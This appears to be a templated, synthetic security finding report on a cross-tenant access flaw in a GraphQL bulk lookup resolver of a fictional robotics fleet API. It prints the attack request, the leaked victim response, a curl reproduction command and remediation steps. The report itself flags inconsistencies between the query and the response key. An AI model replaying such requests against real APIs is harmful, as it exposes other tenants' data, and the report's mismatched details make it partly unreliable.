# Security Analysis Report
**System:** ManuControl Robotics Fleet
**Domain:** Industrial IoT / Manufacturing
**Example ID:** GQL-0307
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Single-User — Pattern 10.2 | Parameter escalation on `bulkResourceLookup` — attacker extends session scope to read manufacturing robot fleet records across tenant boundaries in bulk |

---

## Finding 1 — Single-User: Parameter Escalation via Bulk Lookup (Pattern 10.2)

### Summary
The `bulkResourceLookup` mutation on ManuControl Robotics Fleet (`api.manucontrol-robotics.example.com`) accepts an arbitrary array of `resourceId` values without per-ID ownership or tenancy filtering (RISK-GQL-307). Per §5.0 Pattern 10.2, a single authenticated user extends their own session scope by supplying victim `resourceId` values — including IDs belonging to `tenant-879e` — in their own request using a `tenant-8009` token.

**Context.txt inconsistency (documented):** HAR mutation uses `bulkResourceLookup`, but the response key in §6.0 is `getResource`. These conflict. The HAR (§6.0) is the primary evidence — this analysis follows the operation observed in the HAR (`bulkResourceLookup`). The response key inconsistency is noted as an artifact of the context.txt.

**Redis cache vulnerability:** Cache is keyed by `resourceId` only (no user/tenant dimension), enabling cross-tenant cache poisoning of industrial equipment telemetry data.

**Pattern:** 10.2 — Parameter escalation (own session scope extension) (Single-User)
**Affected resolver:** `bulkResourceLookup`
**Affected endpoint:** `POST https://api.manucontrol-robotics.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.manucontrol-robotics.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json
x-tenant-id: tenant-8009

{"query": "query VulnerableOp { bulkResourceLookup(ids: [\"R-2307\", \"R-1307\", \"R-3307\"]) { resourceId tenantId data { sensitiveField } } }"}
```
Note: `x-request-id` is a **server-assigned response header**, not a request header.

**Response — Victim Resource Returned (cross-tenant)**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-879e",
      "ownerId": "other-user-8009879e",
      "data": {
        "sensitiveField": "CONFIDENTIAL-8009879e",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
Attacker token: `tenant-8009`. Returned data belongs to: `tenant-879e`. Cross-tenant bulk escalation confirmed.

**Context.txt inconsistency:** HAR sends `bulkResourceLookup` mutation; response body uses key `getResource`. HAR operation is authoritative.

### Steps to Reproduce
```bash
curl -s -X POST "https://api.manucontrol-robotics.example.com/graphql" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-8009" \
  -d '{"query": "query VulnerableOp { bulkResourceLookup(ids: [\"R-2307\", \"R-1307\", \"R-3307\"]) { resourceId tenantId data { sensitiveField } } }"}'
# Vulnerable: response contains tenant-879e data — cross-tenant bulk access succeeded
# Secure: {"errors": [{"message": "Forbidden — tenant mismatch on ID R-2307"}]}
```

### Remediation
1. In `bulkResourceLookup`: for each ID in the array, assert `fetched.tenantId === jwt.tenantId`. Reject or skip IDs belonging to other tenants.
2. In `getResource` resolver: assert `fetched.tenantId === jwt.tenantId` post-fetch.
3. Re-key Redis cache to include `tenantId`.
